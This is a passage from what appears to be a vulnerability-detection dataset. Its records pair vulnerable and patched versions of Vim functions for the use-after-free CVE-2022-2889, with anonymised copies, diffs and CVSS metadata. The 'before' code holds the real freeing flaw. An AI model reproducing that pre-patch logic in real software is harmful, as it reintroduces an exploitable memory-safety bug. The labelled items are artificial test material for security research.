VAR_12->pt_func = VAR_11;
VAR_12->pt_refcount = 1;
VAR_1->vval.v_partial = VAR_12;
VAR_1->v_type = VAR_51;
hash_add(&VAR_52, UF2HIKEY(VAR_11));
}
theend:
VAR_20 = VAR_19;
if (VAR_3 != NULL && VAR_3->eval_tofree == NULL)
VAR_3->eval_tofree = VAR_22;
else
vim_free(VAR_22);
vim_free(VAR_23);
if (VAR_2)
ga_clear_strings(&VAR_9);
return VAR_53;
errret:
ga_clear_strings(&VAR_6);
ga_clear_strings(&VAR_7);
ga_clear_strings(&VAR_10);
if (VAR_2)
{
ga_clear_strings(&VAR_9);
if (VAR_11 != NULL)
vim_free(VAR_11->uf_arg_types);
}
vim_free(VAR_11);
vim_free(VAR_12);
if (VAR_3 != NULL && VAR_3->eval_tofree == NULL)
VAR_3->eval_tofree = VAR_22;
else
vim_free(VAR_22);
vim_free(VAR_23);
VAR_20 = VAR_19;
return VAR_32;
}",vim/91c7cbfe31bbef57d5fcf7d76989fc159f73ef15/userfunc.c/vul/before/0.json,"int
get_lambda_tv(
	char_u	    **arg,
	typval_T    *rettv,
	int	    types_optional,
	evalarg_T   *evalarg)
{
    int		evaluate = evalarg != NULL
				      && (evalarg->eval_flags & EVAL_EVALUATE);
    garray_T	newargs;
    garray_T	newlines;
    garray_T	*pnewargs;
    garray_T	argtypes;
    garray_T	default_args;
    ufunc_T	*fp = NULL;
    partial_T   *pt = NULL;
    int		varargs;
    char_u	*ret_type = NULL;
    int		ret;
    char_u	*s;
    char_u	*start, *end;
    int		*old_eval_lavars = eval_lavars_used;
    int		eval_lavars = FALSE;
    char_u	*tofree2 = NULL;
    int		equal_arrow = **arg == '(';
    int		white_error = FALSE;
    int		called_emsg_start = called_emsg;
    int		vim9script = in_vim9script();
    long	start_lnum = SOURCING_LNUM;

    if (equal_arrow && !vim9script)
	return NOTDONE;

    ga_init(&newargs);
    ga_init(&newlines);

    // First, check if this is really a lambda expression. ""->"" or ""=>"" must
    // be found after the arguments.
    s = *arg + 1;
    ret = get_function_args(&s, equal_arrow ? ')' : '-', NULL,
	    types_optional ? &argtypes : NULL, types_optional, evalarg,
					NULL, &default_args, TRUE, NULL, NULL);
    if (ret == FAIL || skip_arrow(s, equal_arrow, &ret_type, NULL) == NULL)
    {
	if (types_optional)
	    ga_clear_strings(&argtypes);
	return called_emsg == called_emsg_start ? NOTDONE : FAIL;
    }

    // Parse the arguments for real.
    if (evaluate)
	pnewargs = &newargs;
    else
	pnewargs = NULL;
    *arg += 1;
    ret = get_function_args(arg, equal_arrow ? ')' : '-', pnewargs,
	    types_optional ? &argtypes : NULL, types_optional, evalarg,
					    &varargs, &default_args,
					    FALSE, NULL, NULL);
    if (ret == FAIL
		  || (s = skip_arrow(*arg, equal_arrow, &ret_type,
		equal_arrow || vim9script ? &white_error : NULL)) == NULL)
    {
	if (types_optional)
	    ga_clear_strings(&argtypes);
	ga_clear_strings(&newargs);
	return white_error ? FAIL : NOTDONE;
    }
    *arg = s;

    // Skipping over linebreaks may make ""ret_type"" invalid, make a copy.
    if (ret_type != NULL)
    {
	ret_type = vim_strsave(ret_type);
	tofree2 = ret_type;
    }

    // Set up a flag for checking local variables and arguments.
    if (evaluate)
	eval_lavars_used = &eval_lavars;

    *arg = skipwhite_and_linebreak(*arg, evalarg);

    // Recognize ""{"" as the start of a function body.
    if (equal_arrow && **arg == '{')
    {
	if (evalarg == NULL)
	    // cannot happen?
	    goto theend;
	SOURCING_LNUM = start_lnum;  // used for where lambda is defined
	if (lambda_function_body(arg, rettv, evalarg, pnewargs,
			   types_optional ? &argtypes : NULL, varargs,
			   &default_args, ret_type) == FAIL)
	    goto errret;
	goto theend;
    }
    if (default_args.ga_len > 0)
    {
	emsg(_(e_cannot_use_default_values_in_lambda));
	goto errret;
    }

    // Get the start and the end of the expression.
    start = *arg;
    ret = skip_expr_concatenate(arg, &start, &end, evalarg);
    if (ret == FAIL)
	goto errret;

    if (!equal_arrow)
    {
	*arg = skipwhite_and_linebreak(*arg, evalarg);
	if (**arg != '}')
	{
	    semsg(_(e_expected_right_curly_str), *arg);
	    goto errret;
	}
	++*arg;
    }

    if (evaluate)
    {
	int	    len;
	int	    flags = FC_LAMBDA;
	char_u	    *p;
	char_u	    *line_end;
	char_u	    *name = get_lambda_name();

	fp = alloc_clear(offsetof(ufunc_T, uf_name) + STRLEN(name) + 1);
	if (fp == NULL)
	    goto errret;
	fp->uf_def_status = UF_NOT_COMPILED;
	pt = ALLOC_CLEAR_ONE(partial_T);
	if (pt == NULL)
	    goto errret;

	ga_init2(&newlines, sizeof(char_u *), 1);
	if (ga_grow(&newlines, 1) == FAIL)
	    goto errret;

	// If there are line breaks, we need to split up the string.
	line_end = vim_strchr(start, '\n');
	if (line_end == NULL || line_end > end)
	    line_end = end;

	// Add ""return "" before the expression (or the first line).
	len = 7 + (int)(line_end - start) + 1;
	p = alloc(len);
	if (p == NULL)
	    goto errret;
	((char_u **)(newlines.ga_data))[newlines.ga_len++] = p;
	STRCPY(p, ""return "");
	vim_strncpy(p + 7, start, line_end - start);

	if (line_end != end)
	{
	    // Add more lines, split by line breaks.  Thus is used when a
	    // lambda with { cmds } is encountered.
	    while (*line_end == '\n')
	    {
		if (ga_grow(&newlines, 1) == FAIL)
		    goto errret;
		start = line_end + 1;
		line_end = vim_strchr(start, '\n');
		if (line_end == NULL)
		    line_end = end;
		((char_u **)(newlines.ga_data))[newlines.ga_len++] =
					 vim_strnsave(start, line_end - start);
	    }
	}

	if (strstr((char *)p + 7, ""a:"") == NULL)
	    // No a: variables are used for sure.
	    flags |= FC_NOARGS;

	fp->uf_refcount = 1;
	set_ufunc_name(fp, name);
	fp->uf_args = newargs;
	ga_init(&fp->uf_def_args);
	if (types_optional)
	{
	    if (parse_argument_types(fp, &argtypes,
						vim9script && varargs) == FAIL)
		goto errret;
	    if (ret_type != NULL)
	    {
		fp->uf_ret_type = parse_type(&ret_type,
						      &fp->uf_type_list, TRUE);
		if (fp->uf_ret_type == NULL)
		    goto errret;
	    }
	    else
		fp->uf_ret_type = &t_unknown;
	}

	fp->uf_lines = newlines;
	if (current_funccal != NULL && eval_lavars)
	{
	    flags |= FC_CLOSURE;
	    if (register_closure(fp) == FAIL)
		goto errret;
	}

#ifdef FEAT_PROFILE
	if (prof_def_func())
	    func_do_profile(fp);
#endif
	if (sandbox)
	    flags |= FC_SANDBOX;
	// In legacy script a lambda can be called with more args than
	// uf_args.ga_len.  In Vim9 script ""...name"" has to be used.
	fp->uf_varargs = !vim9script || varargs;
	fp->uf_flags = flags;
	fp->uf_calls = 0;
	fp->uf_script_ctx = current_sctx;
	// Use the line number of the arguments.
	fp->uf_script_ctx.sc_lnum += start_lnum;

	function_using_block_scopes(fp, evalarg->eval_cstack);

	pt->pt_func = fp;
	pt->pt_refcount = 1;
	rettv->vval.v_partial = pt;
	rettv->v_type = VAR_PARTIAL;

	hash_add(&func_hashtab, UF2HIKEY(fp));
    }

theend:
    eval_lavars_used = old_eval_lavars;
    vim_free(tofree2);
    if (types_optional)
	ga_clear_strings(&argtypes);

    return OK;

errret:
    ga_clear_strings(&newargs);
    ga_clear_strings(&newlines);
    ga_clear_strings(&default_args);
    if (types_optional)
    {
	ga_clear_strings(&argtypes);
	if (fp != NULL)
	    vim_free(fp->uf_arg_types);
    }
    vim_free(fp);
    vim_free(pt);
    vim_free(tofree2);
    eval_lavars_used = old_eval_lavars;
    return FAIL;
}","int
get_lambda_tv(
	char_u	    **VAR_0,
	typval_T    *VAR_1,
	int	    VAR_2,
	evalarg_T   *VAR_3)
{
    int		VAR_4 = VAR_3 != NULL
				      && (VAR_3->eval_flags & VAR_5);
    garray_T	VAR_6;
    garray_T	VAR_7;
    garray_T	*VAR_8;
    garray_T	VAR_9;
    garray_T	VAR_10;
    ufunc_T	*VAR_11 = NULL;
    partial_T   *VAR_12 = NULL;
    int		VAR_13;
    char_u	*VAR_14 = NULL;
    int		VAR_15;
    char_u	*VAR_16;
    char_u	*VAR_17, *VAR_18;
    int		*VAR_19 = VAR_20;
    int		VAR_21 = FALSE;
    char_u	*VAR_22 = NULL;
    int		VAR_23 = **VAR_0 == '(';
    int		VAR_24 = FALSE;
    int		VAR_25 = VAR_26;
    int		VAR_27 = in_vim9script();
    long	VAR_28 = VAR_29;

    if (VAR_23 && !VAR_27)
	return VAR_30;

    ga_init(&VAR_6);
    ga_init(&VAR_7);

    /* COMMENT_0 */
    /* COMMENT_1 */
    VAR_16 = *VAR_0 + 1;
    VAR_15 = get_function_args(&VAR_16, VAR_23 ? ')' : '-', NULL,
	    VAR_2 ? &VAR_9 : NULL, VAR_2, VAR_3,
					NULL, &VAR_10, TRUE, NULL, NULL);
    if (VAR_15 == VAR_31 || skip_arrow(VAR_16, VAR_23, &VAR_14, NULL) == NULL)
    {
	if (VAR_2)
	    ga_clear_strings(&VAR_9);
	return VAR_26 == VAR_25 ? VAR_30 : VAR_31;
    }

    /* COMMENT_2 */
    if (VAR_4)
	VAR_8 = &VAR_6;
    else
	VAR_8 = NULL;
    *VAR_0 += 1;
    VAR_15 = get_function_args(VAR_0, VAR_23 ? ')' : '-', VAR_8,
	    VAR_2 ? &VAR_9 : NULL, VAR_2, VAR_3,
					    &VAR_13, &VAR_10,
					    FALSE, NULL, NULL);
    if (VAR_15 == VAR_31
		  || (VAR_16 = skip_arrow(*VAR_0, VAR_23, &VAR_14,
		VAR_23 || VAR_27 ? &VAR_24 : NULL)) == NULL)
    {
	if (VAR_2)
	    ga_clear_strings(&VAR_9);
	ga_clear_strings(&VAR_6);
	return VAR_24 ? VAR_31 : VAR_30;
    }
    *VAR_0 = VAR_16;

    /* COMMENT_3 */
    if (VAR_14 != NULL)
    {
	VAR_14 = vim_strsave(VAR_14);
	VAR_22 = VAR_14;
    }

    /* COMMENT_4 */
    if (VAR_4)
	VAR_20 = &VAR_21;

    *VAR_0 = skipwhite_and_linebreak(*VAR_0, VAR_3);

    /* COMMENT_5 */
    if (VAR_23 && **VAR_0 == '{')
    {
	if (VAR_3 == NULL)
	    /* COMMENT_6 */
	    goto theend;
	VAR_29 = VAR_28;  /* COMMENT_7 */
	if (lambda_function_body(VAR_0, VAR_1, VAR_3, VAR_8,
			   VAR_2 ? &VAR_9 : NULL, VAR_13,
			   &VAR_10, VAR_14) == VAR_31)
	    goto errret;
	goto theend;
    }
    if (VAR_10.ga_len > 0)
    {
	emsg(_(VAR_32));
	goto errret;
    }

    /* COMMENT_8 */
    VAR_17 = *VAR_0;
    VAR_15 = skip_expr_concatenate(VAR_0, &VAR_17, &VAR_18, VAR_3);
    if (VAR_15 == VAR_31)
	goto errret;

    if (!VAR_23)
    {
	*VAR_0 = skipwhite_and_linebreak(*VAR_0, VAR_3);
	if (**VAR_0 != '}')
	{
	    semsg(_(VAR_33), *VAR_0);
	    goto errret;
	}
	++*VAR_0;
    }

    if (VAR_4)
    {
	int	    VAR_34;
	int	    VAR_35 = VAR_36;
	char_u	    *VAR_37;
	char_u	    *VAR_38;
	char_u	    *VAR_39 = get_lambda_name();

	VAR_11 = alloc_clear(offsetof(ufunc_T, VAR_40) + STRLEN(VAR_39) + 1);
	if (VAR_11 == NULL)
	    goto errret;
	VAR_11->uf_def_status = VAR_41;
	VAR_12 = ALLOC_CLEAR_ONE(partial_T);
	if (VAR_12 == NULL)
	    goto errret;

	ga_init2(&VAR_7, sizeof(char_u *), 1);
	if (ga_grow(&VAR_7, 1) == VAR_31)
	    goto errret;

	/* COMMENT_9 */
	VAR_38 = vim_strchr(VAR_17, '\n');
	if (VAR_38 == NULL || VAR_38 > VAR_18)
	    VAR_38 = VAR_18;

	/* COMMENT_10 */
	VAR_34 = 7 + (int)(VAR_38 - VAR_17) + 1;
	VAR_37 = alloc(VAR_34);
	if (VAR_37 == NULL)
	    goto errret;
	((char_u **)(VAR_7.ga_data))[VAR_7.ga_len++] = VAR_37;
	STRCPY(VAR_37, ""return "");
	vim_strncpy(VAR_37 + 7, VAR_17, VAR_38 - VAR_17);

	if (VAR_38 != VAR_18)
	{
	    /* COMMENT_11 */
	    /* COMMENT_12 */
	    while (*VAR_38 == '\n')
	    {
		if (ga_grow(&VAR_7, 1) == VAR_31)
		    goto errret;
		VAR_17 = VAR_38 + 1;
		VAR_38 = vim_strchr(VAR_17, '\n');
		if (VAR_38 == NULL)
		    VAR_38 = VAR_18;
		((char_u **)(VAR_7.ga_data))[VAR_7.ga_len++] =
					 vim_strnsave(VAR_17, VAR_38 - VAR_17);
	    }
	}

	if (strstr((char *)VAR_37 + 7, ""a:"") == NULL)
	    /* COMMENT_13 */
	    VAR_35 |= VAR_42;

	VAR_11->uf_refcount = 1;
	set_ufunc_name(VAR_11, VAR_39);
	VAR_11->uf_args = VAR_6;
	ga_init(&VAR_11->uf_def_args);
	if (VAR_2)
	{
	    if (parse_argument_types(VAR_11, &VAR_9,
						VAR_27 && VAR_13) == VAR_31)
		goto errret;
	    if (VAR_14 != NULL)
	    {
		VAR_11->uf_ret_type = parse_type(&VAR_14,
						      &VAR_11->uf_type_list, TRUE);
		if (VAR_11->uf_ret_type == NULL)
		    goto errret;
	    }
	    else
		VAR_11->uf_ret_type = &VAR_43;
	}

	VAR_11->uf_lines = VAR_7;
	if (VAR_44 != NULL && VAR_21)
	{
	    VAR_35 |= VAR_45;
	    if (register_closure(VAR_11) == VAR_31)
		goto errret;
	}

#ifdef VAR_46
	if (prof_def_func())
	    func_do_profile(VAR_11);
#endif
	if (VAR_47)
	    VAR_35 |= VAR_48;
	/* COMMENT_14 */
	/* COMMENT_15 */
	VAR_11->uf_varargs = !VAR_27 || VAR_13;
	VAR_11->uf_flags = VAR_35;
	VAR_11->uf_calls = 0;
	VAR_11->uf_script_ctx = VAR_49;
	/* COMMENT_16 */
	VAR_11->uf_script_ctx.sc_lnum += VAR_28;

	function_using_block_scopes(VAR_11, VAR_3->eval_cstack);

	VAR_12->pt_func = VAR_11;
	VAR_12->pt_refcount = 1;
	VAR_1->vval.v_partial = VAR_12;
	VAR_1->v_type = VAR_50;

	hash_add(&VAR_51, UF2HIKEY(VAR_11));
    }

theend:
    VAR_20 = VAR_19;
    vim_free(VAR_22);
    if (VAR_2)
	ga_clear_strings(&VAR_9);

    return VAR_52;

errret:
    ga_clear_strings(&VAR_6);
    ga_clear_strings(&VAR_7);
    ga_clear_strings(&VAR_10);
    if (VAR_2)
    {
	ga_clear_strings(&VAR_9);
	if (VAR_11 != NULL)
	    vim_free(VAR_11->uf_arg_types);
    }
    vim_free(VAR_11);
    vim_free(VAR_12);
    vim_free(VAR_22);
    VAR_20 = VAR_19;
    return VAR_31;
}",vim/91c7cbfe31bbef57d5fcf7d76989fc159f73ef15/userfunc.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -21,7 +21,6 @@
     char_u	*start, *end;
     int		*old_eval_lavars = eval_lavars_used;
     int		eval_lavars = FALSE;
-    char_u	*tofree1 = NULL;
     char_u	*tofree2 = NULL;
     int		equal_arrow = **arg == '(';
     int		white_error = FALSE;
@@ -106,12 +105,6 @@
     ret = skip_expr_concatenate(arg, &start, &end, evalarg);
     if (ret == FAIL)
 	goto errret;
-    if (evalarg != NULL)
-    {
-	// avoid that the expression gets freed when another line break follows
-	tofree1 = evalarg->eval_tofree;
-	evalarg->eval_tofree = NULL;
-    }
 
     if (!equal_arrow)
     {
@@ -234,10 +227,6 @@
 
 theend:
     eval_lavars_used = old_eval_lavars;
-    if (evalarg != NULL && evalarg->eval_tofree == NULL)
-	evalarg->eval_tofree = tofree1;
-    else
-	vim_free(tofree1);
     vim_free(tofree2);
     if (types_optional)
 	ga_clear_strings(&argtypes);
@@ -256,10 +245,6 @@
     }
     vim_free(fp);
     vim_free(pt);
-    if (evalarg != NULL && evalarg->eval_tofree == NULL)
-	evalarg->eval_tofree = tofree1;
-    else
-	vim_free(tofree1);
     vim_free(tofree2);
     eval_lavars_used = old_eval_lavars;
     return FAIL;","{'deleted_lines': ['    char_u\t*tofree1 = NULL;', '    if (evalarg != NULL)', '    {', '\t// avoid that the expression gets freed when another line break follows', '\ttofree1 = evalarg->eval_tofree;', '\tevalarg->eval_tofree = NULL;', '    }', '    if (evalarg != NULL && evalarg->eval_tofree == NULL)', '\tevalarg->eval_tofree = tofree1;', '    else', '\tvim_free(tofree1);', '    if (evalarg != NULL && evalarg->eval_tofree == NULL)', '\tevalarg->eval_tofree = tofree1;', '    else', '\tvim_free(tofree1);'], 'added_lines': []}",True,Use After Free in GitHub repository vim/vim prior to 9.0.0225.,7.8,HIGH,2,valid,2022-08-18T12:28:31Z,4
CVE-2022-2889,['CWE-416'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,vim,"patch 9.0.0225: using freed memory with multiple line breaks in expression

Problem:    Using freed memory with multiple line breaks in expression.
Solution:   Free eval_tofree later.",91c7cbfe31bbef57d5fcf7d76989fc159f73ef15,https://github.com/vim/vim/commit/91c7cbfe31bbef57d5fcf7d76989fc159f73ef15,src/eval.c,eval_next_line,"char_u *
eval_next_line(char_u *arg, evalarg_T *evalarg)
{
garray_T*gap = &evalarg->eval_ga;
char_u*line;
if (arg != NULL)
{
if (*arg == NL)
return newline_skip_comments(arg);
if (*skipwhite(arg) == '#')
*arg = NUL;
}
if (evalarg->eval_cookie != NULL)
line = evalarg->eval_getline(0, evalarg->eval_cookie, 0,
GETLINE_CONCAT_ALL);
else
line = next_line_from_context(evalarg->eval_cctx, TRUE);
if (line == NULL)
return NULL;
++evalarg->eval_break_count;
if (gap->ga_itemsize > 0 && ga_grow(gap, 1) == OK)
{
char_u *p = skipwhite(line);
if (*p == NUL || vim9_comment_start(p))
{
vim_free(line);
line = vim_strsave((char_u *)"""");
}
((char_u **)gap->ga_data)[gap->ga_len] = line;
++gap->ga_len;
}
else if (evalarg->eval_cookie != NULL)
{
vim_free(evalarg->eval_tofree);
evalarg->eval_tofree = line;
}
evalarg->eval_using_cmdline = FALSE;
return skipwhite(line);
}","char_u *
eval_next_line(char_u *VAR_0, evalarg_T *VAR_1)
{
garray_T*VAR_2 = &VAR_1->eval_ga;
char_u*VAR_3;
if (VAR_0 != NULL)
{
if (*VAR_0 == VAR_4)
return newline_skip_comments(VAR_0);
if (*skipwhite(VAR_0) == '#')
*VAR_0 = VAR_5;
}
if (VAR_1->eval_cookie != NULL)
VAR_3 = VAR_1->eval_getline(0, VAR_1->eval_cookie, 0,
VAR_6);
else
VAR_3 = next_line_from_context(VAR_1->eval_cctx, TRUE);
if (VAR_3 == NULL)
return NULL;
++VAR_1->eval_break_count;
if (VAR_2->ga_itemsize > 0 && ga_grow(VAR_2, 1) == VAR_7)
{
char_u *VAR_8 = skipwhite(VAR_3);
if (*VAR_8 == VAR_5 || vim9_comment_start(VAR_8))
{
vim_free(VAR_3);
VAR_3 = vim_strsave((char_u *)"""");
}
((char_u **)VAR_2->ga_data)[VAR_2->ga_len] = VAR_3;
++VAR_2->ga_len;
}
else if (VAR_1->eval_cookie != NULL)
{
vim_free(VAR_1->eval_tofree);
VAR_1->eval_tofree = VAR_3;
}
VAR_1->eval_using_cmdline = FALSE;
return skipwhite(VAR_3);
}",vim/91c7cbfe31bbef57d5fcf7d76989fc159f73ef15/eval.c/vul/before/1.json,"char_u *
eval_next_line(char_u *arg, evalarg_T *evalarg)
{
    garray_T	*gap = &evalarg->eval_ga;
    char_u	*line;

    if (arg != NULL)
    {
	if (*arg == NL)
	    return newline_skip_comments(arg);
	// Truncate before a trailing comment, so that concatenating the lines
	// won't turn the rest into a comment.
	if (*skipwhite(arg) == '#')
	    *arg = NUL;
    }

    if (evalarg->eval_cookie != NULL)
	line = evalarg->eval_getline(0, evalarg->eval_cookie, 0,
							   GETLINE_CONCAT_ALL);
    else
	line = next_line_from_context(evalarg->eval_cctx, TRUE);
    if (line == NULL)
	return NULL;

    ++evalarg->eval_break_count;
    if (gap->ga_itemsize > 0 && ga_grow(gap, 1) == OK)
    {
	char_u *p = skipwhite(line);

	// Going to concatenate the lines after parsing.  For an empty or
	// comment line use an empty string.
	if (*p == NUL || vim9_comment_start(p))
	{
	    vim_free(line);
	    line = vim_strsave((char_u *)"""");
	}

	((char_u **)gap->ga_data)[gap->ga_len] = line;
	++gap->ga_len;
    }
    else if (evalarg->eval_cookie != NULL)
    {
	free_eval_tofree_later(evalarg);
	evalarg->eval_tofree = line;
    }

    // Advanced to the next line, ""arg"" no longer points into the previous
    // line.
    evalarg->eval_using_cmdline = FALSE;
    return skipwhite(line);
}","char_u *
eval_next_line(char_u *VAR_0, evalarg_T *VAR_1)
{
    garray_T	*VAR_2 = &VAR_1->eval_ga;
    char_u	*VAR_3;

    if (VAR_0 != NULL)
    {
	if (*VAR_0 == VAR_4)
	    return newline_skip_comments(VAR_0);
	/* COMMENT_0 */
	/* COMMENT_1 */
	if (*skipwhite(VAR_0) == '#')
	    *VAR_0 = VAR_5;
    }

    if (VAR_1->eval_cookie != NULL)
	VAR_3 = VAR_1->eval_getline(0, VAR_1->eval_cookie, 0,
							   VAR_6);
    else
	VAR_3 = next_line_from_context(VAR_1->eval_cctx, TRUE);
    if (VAR_3 == NULL)
	return NULL;

    ++VAR_1->eval_break_count;
    if (VAR_2->ga_itemsize > 0 && ga_grow(VAR_2, 1) == VAR_7)
    {
	char_u *VAR_8 = skipwhite(VAR_3);

	/* COMMENT_2 */
	/* COMMENT_3 */
	if (*VAR_8 == VAR_5 || vim9_comment_start(VAR_8))
	{
	    vim_free(VAR_3);
	    VAR_3 = vim_strsave((char_u *)"""");
	}

	((char_u **)VAR_2->ga_data)[VAR_2->ga_len] = VAR_3;
	++VAR_2->ga_len;
    }
    else if (VAR_1->eval_cookie != NULL)
    {
	free_eval_tofree_later(VAR_1);
	VAR_1->eval_tofree = VAR_3;
    }

    /* COMMENT_4 */
    /* COMMENT_5 */
    VAR_1->eval_using_cmdline = FALSE;
    return skipwhite(VAR_3);
}",vim/91c7cbfe31bbef57d5fcf7d76989fc159f73ef15/eval.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -40,7 +40,7 @@
     }
     else if (evalarg->eval_cookie != NULL)
     {
-	vim_free(evalarg->eval_tofree);
+	free_eval_tofree_later(evalarg);
 	evalarg->eval_tofree = line;
     }
 ","{'deleted_lines': ['\tvim_free(evalarg->eval_tofree);'], 'added_lines': ['\tfree_eval_tofree_later(evalarg);']}",True,Use After Free in GitHub repository vim/vim prior to 9.0.0225.,7.8,HIGH,2,valid,2022-08-18T12:28:31Z,4
CVE-2022-2889,['CWE-416'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,vim,"patch 9.0.0225: using freed memory with multiple line breaks in expression

Problem:    Using freed memory with multiple line breaks in expression.
Solution:   Free eval_tofree later.",91c7cbfe31bbef57d5fcf7d76989fc159f73ef15,https://github.com/vim/vim/commit/91c7cbfe31bbef57d5fcf7d76989fc159f73ef15,src/eval.c,skip_expr_concatenate,"int
skip_expr_concatenate(
char_u    **arg,
char_u    **start,
char_u    **end,
evalarg_T   *evalarg)
{
typval_Trettv;
intres;
intvim9script = in_vim9script();
garray_T    *gap = evalarg == NULL ? NULL : &evalarg->eval_ga;
garray_T    *freegap = evalarg == NULL ? NULL : &evalarg->eval_freega;
intsave_flags = evalarg == NULL ? 0 : evalarg->eval_flags;
intevaluate = evalarg == NULL
? FALSE : (evalarg->eval_flags & EVAL_EVALUATE);
if (vim9script && evaluate
&& (evalarg->eval_cookie != NULL || evalarg->eval_cctx != NULL))
{
ga_init2(gap, sizeof(char_u *), 10);
if (ga_grow(gap, 1) == OK)
++gap->ga_len;
ga_init2(freegap, sizeof(char_u *), 10);
}
*start = *arg;
if (evalarg != NULL)
evalarg->eval_flags &= ~EVAL_EVALUATE;
*arg = skipwhite(*arg);
res = eval1(arg, &rettv, evalarg);
*end = *arg;
if (evalarg != NULL)
evalarg->eval_flags = save_flags;
if (vim9script && evaluate
&& (evalarg->eval_cookie != NULL || evalarg->eval_cctx != NULL))
{
if (evalarg->eval_ga.ga_len == 1)
{
ga_clear(gap);
gap->ga_itemsize = 0;
}
else
{
char_u    *p;
size_t    endoff = STRLEN(*arg);
*((char_u **)gap->ga_data) = *start;
p = ga_concat_strings(gap, "" "");
if (evalarg->eval_cookie != NULL)
{
*((char_u **)gap->ga_data) = NULL;
vim_free(evalarg->eval_tofree);
evalarg->eval_tofree =
((char_u **)gap->ga_data)[gap->ga_len - 1];
((char_u **)gap->ga_data)[gap->ga_len - 1] = NULL;
ga_clear_strings(gap);
}
else
{
ga_clear(gap);
ga_clear_strings(freegap);
}
gap->ga_itemsize = 0;
if (p == NULL)
return FAIL;
*start = p;
vim_free(evalarg->eval_tofree_lambda);
evalarg->eval_tofree_lambda = p;
*end = *start + STRLEN(*start) - endoff;
}
}
return res;
}","int
skip_expr_concatenate(
char_u    **VAR_0,
char_u    **VAR_1,
char_u    **VAR_2,
evalarg_T   *VAR_3)
{
typval_TVAR_4;
intVAR_5;
intVAR_6 = in_vim9script();
garray_T    *VAR_7 = VAR_3 == NULL ? NULL : &VAR_3->eval_ga;
garray_T    *VAR_8 = VAR_3 == NULL ? NULL : &VAR_3->eval_freega;
intVAR_9 = VAR_3 == NULL ? 0 : VAR_3->eval_flags;
intVAR_10 = VAR_3 == NULL
? FALSE : (VAR_3->eval_flags & VAR_11);
if (VAR_6 && VAR_10
&& (VAR_3->eval_cookie != NULL || VAR_3->eval_cctx != NULL))
{
ga_init2(VAR_7, sizeof(char_u *), 10);
if (ga_grow(VAR_7, 1) == VAR_12)
++VAR_7->ga_len;
ga_init2(VAR_8, sizeof(char_u *), 10);
}
*VAR_1 = *VAR_0;
if (VAR_3 != NULL)
VAR_3->eval_flags &= ~VAR_11;
*VAR_0 = skipwhite(*VAR_0);
VAR_5 = eval1(VAR_0, &VAR_4, VAR_3);
*VAR_2 = *VAR_0;
if (VAR_3 != NULL)
VAR_3->eval_flags = VAR_9;
if (VAR_6 && VAR_10
&& (VAR_3->eval_cookie != NULL || VAR_3->eval_cctx != NULL))
{
if (VAR_3->eval_ga.ga_len == 1)
{
ga_clear(VAR_7);
VAR_7->ga_itemsize = 0;
}
else
{
char_u    *VAR_13;
size_t    VAR_14 = STRLEN(*VAR_0);
*((char_u **)VAR_7->ga_data) = *VAR_1;
VAR_13 = ga_concat_strings(VAR_7, "" "");
if (VAR_3->eval_cookie != NULL)
{
*((char_u **)VAR_7->ga_data) = NULL;
vim_free(VAR_3->eval_tofree);
VAR_3->eval_tofree =
((char_u **)VAR_7->ga_data)[VAR_7->ga_len - 1];
((char_u **)VAR_7->ga_data)[VAR_7->ga_len - 1] = NULL;
ga_clear_strings(VAR_7);
}
else
{
ga_clear(VAR_7);
ga_clear_strings(VAR_8);
}
VAR_7->ga_itemsize = 0;
if (VAR_13 == NULL)
return VAR_15;
*VAR_1 = VAR_13;
vim_free(VAR_3->eval_tofree_lambda);
VAR_3->eval_tofree_lambda = VAR_13;
*VAR_2 = *VAR_1 + STRLEN(*VAR_1) - VAR_14;
}
}
return VAR_5;
}",vim/91c7cbfe31bbef57d5fcf7d76989fc159f73ef15/eval.c/vul/before/0.json,"int
skip_expr_concatenate(
	char_u	    **arg,
	char_u	    **start,
	char_u	    **end,
	evalarg_T   *evalarg)
{
    typval_T	rettv;
    int		res;
    int		vim9script = in_vim9script();
    garray_T    *gap = evalarg == NULL ? NULL : &evalarg->eval_ga;
    garray_T    *freegap = evalarg == NULL ? NULL : &evalarg->eval_freega;
    int		save_flags = evalarg == NULL ? 0 : evalarg->eval_flags;
    int		evaluate = evalarg == NULL
			       ? FALSE : (evalarg->eval_flags & EVAL_EVALUATE);

    if (vim9script && evaluate
	       && (evalarg->eval_cookie != NULL || evalarg->eval_cctx != NULL))
    {
	ga_init2(gap, sizeof(char_u *), 10);
	// leave room for ""start""
	if (ga_grow(gap, 1) == OK)
	    ++gap->ga_len;
	ga_init2(freegap, sizeof(char_u *), 10);
    }
    *start = *arg;

    // Don't evaluate the expression.
    if (evalarg != NULL)
	evalarg->eval_flags &= ~EVAL_EVALUATE;
    *arg = skipwhite(*arg);
    res = eval1(arg, &rettv, evalarg);
    *end = *arg;
    if (evalarg != NULL)
	evalarg->eval_flags = save_flags;

    if (vim9script && evaluate
	    && (evalarg->eval_cookie != NULL || evalarg->eval_cctx != NULL))
    {
	if (evalarg->eval_ga.ga_len == 1)
	{
	    // just the one line, no need to concatenate
	    ga_clear(gap);
	    gap->ga_itemsize = 0;
	}
	else
	{
	    char_u	    *p;
	    size_t	    endoff = STRLEN(*arg);

	    // Line breaks encountered, concatenate all the lines.
	    *((char_u **)gap->ga_data) = *start;
	    p = ga_concat_strings(gap, "" "");

	    // free the lines only when using getsourceline()
	    if (evalarg->eval_cookie != NULL)
	    {
		// Do not free the first line, the caller can still use it.
		*((char_u **)gap->ga_data) = NULL;
		// Do not free the last line, ""arg"" points into it, free it
		// later.  Also free ""eval_tofree"" later if needed.
		free_eval_tofree_later(evalarg);
		evalarg->eval_tofree =
				    ((char_u **)gap->ga_data)[gap->ga_len - 1];
		((char_u **)gap->ga_data)[gap->ga_len - 1] = NULL;
		ga_clear_strings(gap);
	    }
	    else
	    {
		ga_clear(gap);

		// free lines that were explicitly marked for freeing
		ga_clear_strings(freegap);
	    }

	    gap->ga_itemsize = 0;
	    if (p == NULL)
		return FAIL;
	    *start = p;
	    vim_free(evalarg->eval_tofree_lambda);
	    evalarg->eval_tofree_lambda = p;
	    // Compute ""end"" relative to the end.
	    *end = *start + STRLEN(*start) - endoff;
	}
    }

    return res;
}","int
skip_expr_concatenate(
	char_u	    **VAR_0,
	char_u	    **VAR_1,
	char_u	    **VAR_2,
	evalarg_T   *VAR_3)
{
